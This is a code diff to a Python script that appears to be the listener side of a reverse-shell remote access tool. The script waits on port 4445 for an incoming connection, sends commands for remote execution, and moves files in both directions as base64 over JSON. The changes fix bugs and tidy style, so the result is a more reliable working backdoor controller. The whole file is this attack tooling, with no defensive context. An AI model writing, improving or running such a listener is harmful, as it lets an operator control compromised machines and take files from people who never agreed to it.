@@ -1,8 +1,10 @@
-import socket, json, base64
+import socket
+import json
+import base64
 
 
-IP = "0.0.0.0".encode(("utf-8")) # change this
-PORT = 4445 # change this (Integer Only)
+IP = "0.0.0.0".encode("utf-8")  # change this
+PORT = 4445  # change this (Integer Only)
 
 
 class Listener:
@@ -11,27 +13,25 @@ class Listener:
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((ip, port))
         listener.listen(0)
-        print ("[*] Listening for incoming connections")
+        print("[*] Listening for incoming connections")
         self.connection, self.address = listener.accept()
         print(("[+] Connection Established at [ %s ]" % str(self.address)))
 
     def json_send(self, data):
         json_data = json.dumps(data).encode('utf-8')
-        while True:
-            try:
-                self.connection.send(json_data)
-            except ValueError:
-                continue
+        self.connection.send(json_data)
+
     def json_recv(self):
         json_data = ""
         while True:
             try:
-                
+
                 json_data += self.connection.recv(1024).decode('utf-8')
                 #return json.loads(json_data)
+                return json.loads(json_data)
             except ValueError:
                 continue
-        return json.loads(json_data)
+        
 
     def execute_remotely(self, command):
         self.json_send(command)
@@ -39,15 +39,22 @@ class Listener:
             self.connection.close()
             exit()
         return self.json_recv()
+
     def write_file(self, path, content):
-        with open(path, "wb") as file:
-            decoded_file = base64.b64decode(content)
-            file.write(decoded_file)
-            return "Downloaded [%s] Successfully ." % path
+        try:
+            with open(path, "wb") as file:
+                decoded_file = base64.b64decode(content)
+                file.write(decoded_file)
+                return "Downloaded [%s] Successfully ." % path
+        except Exception as e:
+            print ("[-] Error during file download. \n %s" % (e))
     def read_file(self, path):
-        with open(path, "rb") as file:
-            encoded_file = base64.b64encode(file.read())
-            return encoded_file
+        try:
+            with open(path, "rb")as file:
+                encoded_file = base64.b64encode(file.read())
+                return encoded_file
+        except Exception as e:
+            print ("[-] Error during file upload. \n %s" % (e))
 
     def run(self):
         while True:
@@ -61,8 +68,8 @@ class Listener:
                 if cmd[0] == "download" and "[-] Error " not in result:
                     result = self.write_file(cmd[1], result)
             except Exception as e:
-                result = "[-] Error during command execution. \n %s" %(e)
-            print (result)
+                result = "[-] Error during command execution. \n %s" % (e)
+            print(result)
 
 
 app = Listener(IP, PORT)
